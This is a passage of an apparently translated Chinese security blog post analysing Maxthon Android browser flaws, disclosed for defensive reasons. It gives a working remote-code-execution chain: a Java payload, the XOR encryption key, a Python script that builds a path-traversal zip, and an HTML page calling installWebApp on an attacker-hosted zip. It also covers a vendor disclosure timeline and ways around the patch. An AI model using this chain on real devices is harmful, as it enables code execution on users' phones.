<p><img class="alignnone size-full wp-image-91940 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile4.png" alt="dexfile4" width="2602" height="948" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile4.png 2602w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile4-300x109.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile4-768x280.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile4-1024x373.png 1024w" sizes="(max-width: 2602px) 100vw, 2602px" /></p>
<p>—— 现在我们可以反编译代码了</p>
<h2>利用任意文件写入三 &#8211; 远程代码执行</h2>
<p>这时，所有要点聚在一起，我意识到通过任意文件写入漏洞远程执行代码是可行的。</p>
<ol>
<li>创建我们的 Java 代码然后将它编译至 APK 文件。</li>
<li>使用 igexin 的超级 XOR 加密算法加密我们的 APK 文件，使用“5f8286ee3424bed2b71f66d996b247b8” 作为我们的加密密钥。</li>
<li>创建一个 zip 文件，用来覆盖浏览器的 tdata_tqS304 文件（加密的 JAR 文件）。</li>
<li>欺骗受害者浏览一个能触发 installWebApp 方法的恶意页面，这会使受害者的浏览器下载并解压缩我们的zip文件。<br />
此时，受害者的 tdata_rqS304 文件将替换为我们制作的文件。</li>
<li>下次浏览器再次启动时（可能在移动设备重新启动后），我们的代码将被解密，加载然后执行。</li>
</ol>
<p>广告库从 tdata_rqS304 文件加载 com.igexin.push.extension.distribution.basic.stub.PushExtension 类，像前面说过的，我们要做的是创建一个带有以下类的 APK。</p>
<pre>package com.igexin.push.extension.distribution.basic.stub;

import java.io.BufferedReader; 
import java.io.InputStreamReader;

import android.util.Log;

public class PushExtension {

public PushExtension() {
 Log.wtf("MAX", "Java code execution!");
 try {
 Runtime runtime = Runtime.getRuntime();
 Process process = runtime.exec("id");
 BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
 String s = null;
 while ((s = stdInput.readLine()) != null) {
 Log.wtf("MAX", s);
 }
 }
 catch(Exception e) { }
 }

}</pre>
<p>接下来，我们需要加密APK文件。 我们实际上可以重复使用之前开发的解密程序来执行，已经提供了本地加密算法（dec（cipher_text，key）== plaintext / dec（plaintext，key）== cipher_text）。</p>
<pre>...
 public static void main(String[] args) throws Exception {
 String ciphertextFilename = "exploit/MaxJunkExploit.apk";
 String plaintextFilename = "exploit/tdata_rqS304";
 String keyString = "5f8286ee3424bed2b71f66d996b247b8";

File ciphertextFile = new File(ciphertextFilename);
 File plaintextFile = new File(plaintextFilename);
 decryptFile(ciphertextFile, plaintextFile, keyString);
 }
...</pre>
<p>同理，我们使用 Python 代码来构建 zip 文件。</p>
<pre>import zipfile 
import sys

if __name__ == "__main__": 
 try:
 with open("tdata_rqS304", "r") as f:
 binary = f.read()
 zipFile = zipfile.ZipFile("maxFileWriteToRce9313.zip", "a", zipfile.ZIP_DEFLATED)
 zipFile.writestr("../../../../../data/data/com.mx.browser/files/tdata_rqS304", binary)
 zipFile.close()
 except IOError as e:
 raise e</pre>
<p>然后我们制作调用 installWebApp 方法的 HTML 页面。</p>
<pre>&lt;html&gt; 
&lt;body&gt; 
&lt;script&gt; 
mmbrowser.installWebApp("http://d3adend.org/test/maxFileWriteToRce9313.zip"); 
&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;</pre>
<p>此时如果受害者使用 Maxthon 浏览器访问恶意页面，那么他们的加密 JAR 文件（tdata_rqS304)将被我们制作的 JAR 文件覆盖。</p>
<p><img class="alignnone size-full wp-image-91941 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/max_rce0.png" alt="max_rce0" width="720" height="1280" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/max_rce0.png 720w, http://www.mottoin.com/wp-content/uploads/2016/11/max_rce0-169x300.png 169w, http://www.mottoin.com/wp-content/uploads/2016/11/max_rce0-576x1024.png 576w" sizes="(max-width: 720px) 100vw, 720px" /></p>
<p>—— 校验 “webapp” 已安装</p>
<p>我们的 Java payload 将在下次浏览器重新启动时解密并执行。执行类加载的代码会尝试使用 IPushExtension 接口转换对象，该操作会失败，但是我们的代码在构造函数中已经执行，并且类加载已经代码正常处理该异常，所以浏览器工作正常不会崩溃。</p>
<p><img class="alignnone size-full wp-image-91942 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/max_rce1.png" alt="max_rce1" width="2102" height="462" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/max_rce1.png 2102w, http://www.mottoin.com/wp-content/uploads/2016/11/max_rce1-300x66.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/max_rce1-768x169.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/max_rce1-1024x225.png 1024w" sizes="(max-width: 2102px) 100vw, 2102px" /></p>
<p>—— 执行远程代码完毕</p>
<h2>漏洞披露流程</h2>
<ul>
<li>2/12/16 – 向厂商公开任意文件写入/远程代码执行漏洞。</li>
<li>2/14/16 – 向厂商公开登录页 UXSS 漏洞和 SQL 注入漏洞。</li>
<li>2/15/16 – 厂商回应说所有问题已修复。提供了本地服务器上的新 APK 的链接。</li>
<li>2/15/16 – 要求供应商直接发送修复后的 APK ，或直接在公网服务器上提供访问。</li>
<li>2/18/16 – 厂商提供新 APK 的公网链接。</li>
<li>2/18/16 – 通知厂商修复程序未正确解决所有问题 (仅解决部分问题)。</li>
<li>2/19/16 – 厂商声明他们正在研究。</li>
<li>3/8/16 – 询问厂商的状态。</li>
<li>3/9/16 – 厂商声明所有问题已修复，但不提供新的 APK 进行审计。</li>
<li>5/9/16 – 厂商在 Google Play 上发布了补丁（“bugs fixed”）。</li>
<li>5/30/16 – 通知厂商补丁并未正确解决所谓问题（此时只解决了两个问题）。</li>
<li>5/31/16 – 厂商表示我的评论正在接受审核（自动回复）。没有后续回应。</li>
<li>7/6/16 – 向厂商查询状态，没有回应。</li>
<li>11/5/16 – 再一次向厂商查询状态，没有回应。</li>
</ul>
<p>这时厂商已经不再做出响应，而且只有一些问题被修复。</p>
<ul>
<li>旧设备（&lt;4.2）上的原创代码执行漏洞 &#8211; 并未修复。厂商标记为“不再修复”。</li>
<li>任意文件写入，可以导致任何设备远程代码执行 &#8211; 没有修复。</li>
<li>登录页 UXSS &#8211; 看起来是修复了（一些域名验证，但是没有对输出进行编码）</li>
<li>SQL 注入 &#8211; 看起来修复了（使用参数化的 SQL 语句）。</li>
</ul>
<p>其中一个补丁试图根据域名限制哪些网页可以使用 installWebApp 方法。</p>
<pre>@JavascriptInterface public void installWebApp(String arg4) {
 URI v0 = URI.create(arg4);
 if((v0.getHost().endsWith("maxthon.com")) || (v0.getHost().endsWith("maxthon.cn"))) {
 String v0_1 = x.a(arg4);
 p.a(arg4, "/sdcard/webapp/" + v0_1, null);
 y.b("/sdcard/webapp/" + v0_1);
 d.b().a();
 Toast.makeText(this.mContext, "webapp installed", 1).show();
 }
}</pre>
<p>以前的代码有多个问题，我已多次向厂商指出。</p>
<ol>
<li>从 thisisevilmaxthon.com （以 “maxthon.com”结尾）提供的 JavaScript 仍然可以直接利用任意文件写入漏洞。</li>
<li>该 zip 文件仍然可以通过 HTTP 提供，因此内网攻击者可以强制通过 HTTP 从 maxthon.com 下载一个 zip 文件，然后 MiTM（中间人工具）劫持流量，以间接利用任意文件写入漏洞。</li>
</ol>
<h2>结论</h2>
<ul>
<li>远程 SQL 注入对移动应用是一件事，但是鉴于 SQLite 的限制，提取数据方面可能存在一些问题。</li>
<li>移动应用仍在通过 JavaScript 接口暴露有趣的行为，但是我们将不得不花费更多时间逆向目标应用程序以找出安全隐患</li>
<li>通过动态类加载进行混淆使用可能会导致意想不到的安全隐患</li>
</ul>
                                                        <div class="entry-copyright"><p>原创文章，作者：Moto，如若转载，请注明出处：http://www.mottoin.com/91910.html</p></div>                        </div>
                        <div class="entry-footer">
                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/sql%e6%b3%a8%e5%85%a5" rel="tag">SQL注入</a><a href="http://www.mottoin.com/tag/uxss" rel="tag">UXSS</a><a href="http://www.mottoin.com/tag/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" rel="tag">代码执行</a><a href="http://www.mottoin.com/tag/%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5" rel="tag">任意文件写入</a><a href="http://www.mottoin.com/tag/%e5%82%b2%e6%b8%b8%e6%b5%8f%e8%a7%88%e5%99%a8" rel="tag">傲游浏览器</a></div>
                            <div class="entry-action">
                                <div class="btn-zan" data-id="91910"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(0)</span></div>

                                
                            </div>
                            <div class="entry-bar">
                                <div class="entry-bar-inner clearfix">
                                                                            <div class="author pull-left">
                                            <a data-user="7" target="_blank" href="http://www.mottoin.com/user/seceditor/" class="avatar">
                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="Moto" />                                                Moto                                            </a>
                                            <span class="author-title">普通用户</span>                                         </div>
                                                                        <div class="info pull-right">
                                        <div class="info-item meta">
                                            <a class="meta-item j-heart" href="javascript:;" data-id="91910"><i class="fa fa-heart"></i> <span class="data">0</span></a>
                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">0</span></a>
                                                                                    </div>
                                        <div class="info-item share">
                                            <a class="meta-item" href="javascript:;">
                                                <i class="fa fa-wechat"></i>
                                                <span class="wx-wrap">
                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/91910.html">
                                                    <span>扫码分享到微信</span>
                                                </span>
                                            </a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=tsina&key=&url=http%3A%2F%2Fwww.mottoin.com%2F91910.html&title=%E5%82%B2%E6%B8%B8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%2C+%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2C+UXSS%2C+SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90" target="_blank"><i class="fa fa-weibo"></i></a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=qzone&key=&url=http%3A%2F%2Fwww.mottoin.com%2F91910.html&title=%E5%82%B2%E6%B8%B8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%2C+%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2C+UXSS%2C+SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90" target="_blank"><i class="fa fa-qq"></i></a>
                                        </div>
                                        <div class="info-item act">
                                            <a href="javascript:;" id="j-reading"><i class="fa fa-file-text"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                                                        <h3 class="entry-related-title">相关推荐</h3><ul class="entry-related clearfix"><li><a href="http://www.mottoin.com/92388.html" title="使用DNX.EXE绕过应用白名单">使用DNX.EXE绕过应用白名单</a></li><li><a href="http://www.mottoin.com/93236.html" title="Android逆向与病毒分析">Android逆向与病毒分析</a></li><li><a href="http://www.mottoin.com/96950.html" title="我是如何通过网络摄像头分析wifi密码的">我是如何通过网络摄像头分析wifi密码的</a></li><li><a href="http://www.mottoin.com/84082.html" title="移动安全之Android安全检测工具大全">移动安全之Android安全检测工具大全</a></li><li><a href="http://www.mottoin.com/88234.html" title="Pegasus – 针对iOS设备的APT攻击分析">Pegasus – 针对iOS设备的APT攻击分析</a></li><li><a href="http://www.mottoin.com/92104.html" title="使用Raspberry Pi Zero在锁定的计算机中安装后门">使用Raspberry Pi Zero在锁定的计算机中安装后门</a></li><li><a href="http://www.mottoin.com/85217.html" title="iOS客户端hack的两种姿势">iOS客户端hack的两种姿势</a></li><li><a href="http://www.mottoin.com/94230.html" title="基于文件特征的Android模拟器检测（附代码下载）">基于文件特征的Android模拟器检测（附代码下载）</a></li><li><a href="http://www.mottoin.com/88060.html" title="Dark Mobile Bank之移动银行应用仿冒攻击威胁分析报告">Dark Mobile Bank之移动银行应用仿冒攻击威胁分析报告</a></li><li><a href="http://www.mottoin.com/101625.html" title="如何在Kali Linux上使用公网IP">如何在Kali Linux上使用公网IP</a></li></ul>                        </div>
                        
<div id="comments" class="entry-comments">
    	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/91910.html#respond" style="display:none;">取消回复</a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="http://www.mottoin.com/login">登录</a>后才能评论</div> <input name="submit" type="submit" id="must-submit" class="submit" value="发表"></div></div>	</div><!-- #respond -->
		</div><!-- .comments-area -->                    </div>
                </article>
                    </div>
        <aside class="sidebar">
            <div id="profile-3" class="widget widget_profile">                <div class="cover_photo"></div>
                        <div class="avatar-wrap">
                <a target="_blank" href="http://www.mottoin.com/user/seceditor/" class="avatar-link"><img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-120 um-avatar um-avatar-gravatar" width="120" height="120" alt="Moto" /></a></div>
            <div class="profile-info">
                <p><span class="author-name">Moto</span><span class="author-title">普通用户</span></p>
                <p class="author-description"></p>
            </div>
            <div class="profile-posts">
                <h3 class="widget-title"><span>最近文章</span></h3>
                <ul>                    <li><a href="http://www.mottoin.com/101279.html" title="Windows内核漏洞发现与利用">Windows内核漏洞发现与利用</a></li>
                                    <li><a href="http://www.mottoin.com/100495.html" title="浏览器信息收集: 利用 PowerShell 无文件读取 Chrome Cookie">浏览器信息收集: 利用 PowerShell 无文件读取 Chrome Cookie</a></li>
                                    <li><a href="http://www.mottoin.com/99735.html" title="一键无文件感染技术分析">一键无文件感染技术分析</a></li>
                                    <li><a href="http://www.mottoin.com/99776.html" title="APT10：中国黑客组织攻击全球IT服务供应商">APT10：中国黑客组织攻击全球IT服务供应商</a></li>
                                    <li><a href="http://www.mottoin.com/99257.html" title="IIS 6.0 WebDAV远程代码执行（CVE-2017-7269）">IIS 6.0 WebDAV远程代码执行（CVE-2017-7269）</a></li>
                </ul>            </div>
            </div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a class="btn-post" href="/question"><i class="fa fa-edit"></i> 我要提问</a></div></div><div id="post-thumb-3" class="widget widget_post_thumb">            <ul>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">“黑客反击”的合法化之争</a></p>
                            <p class="item-date">2017年9月20日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG929-480x300.jpeg" width="480" height="300" alt="美参议员要求电信巨头们回应SS7信令系统的安全问题">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">美参议员要求电信巨头们回应SS7信令系统的安全问题</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG928-480x300.jpeg" width="480" height="300" alt="美国国土安全部发布禁止使用卡巴斯基产品的明细">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">美国国土安全部发布禁止使用卡巴斯基产品的明细</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG906-480x300.jpeg" width="480" height="300" alt="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15057198871-480x300.png" width="480" height="300" alt="全球首款网络安全概念车驶入上海滩">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">全球首款网络安全概念车驶入上海滩</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG897-480x300.jpeg" width="480" height="300" alt="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG896-480x300.jpeg" width="480" height="300" alt="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护</a></p>
                            <p class="item-date">2017年9月17日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场</a></p>
                            <p class="item-date">2017年9月16日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG132-480x300.jpeg" width="480" height="300" alt="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协</a></p>
                            <p class="item-date">2017年9月16日</p>
                        </div>
                    </li>
                            </ul>
        </div><div id="lastest-products-4" class="widget widget_lastest_products">            <ul class="p-list clearfix">
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105921.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    “黑客反击”的合法化之争                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105858.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
                                    DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105847.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
                                    国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105799.html">
                                <img width="480" height="300" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" class="attachment-post-thumbnail size-post-thumbnail j-lazy wp-post-image" alt="暗网系列之：“入店行窃者”的工具、战术和克星" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15054708381-150x150-480x300.png" />                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105799.html" title="暗网系列之：“入店行窃者”的工具、战术和克星">
                                    暗网系列之：“入店行窃者”的工具、战术和克星                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105703.html">
                                <img width="480" height="300" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" class="attachment-post-thumbnail size-post-thumbnail j-lazy wp-post-image" alt="【现场还原】补天漏洞情报发布会记事" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG82-150x150-480x300.jpeg" />                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105703.html" title="【现场还原】补天漏洞情报发布会记事">
                                    【现场还原】补天漏洞情报发布会记事                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105692.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG75-480x300.jpeg" width="480" height="300" alt="SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105692.html" title="SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼">
                                    SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105642.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG58-480x300.jpeg" width="480" height="300" alt="大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105642.html" title="大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全">
                                    大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105621.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG512-480x300.jpeg" width="480" height="300" alt="【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105621.html" title="【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？">
                                    【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105629.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG49-480x300.jpeg" width="480" height="300" alt="ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105629.html" title="ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛">
                                    ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105603.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG42-480x300.jpeg" width="480" height="300" alt="【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105603.html" title="【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓">
                                    【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓                                </a>
                            </h4>
                        </div>
                    </li>
                            </ul>
        </div>        </aside>
    </div>
<div class="modal" id="login-modal">
    <div class="modal-dialog modal-sm">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
                <h4 class="modal-title">请登录</h4>
            </div>
            <div class="modal-body login-modal-body">
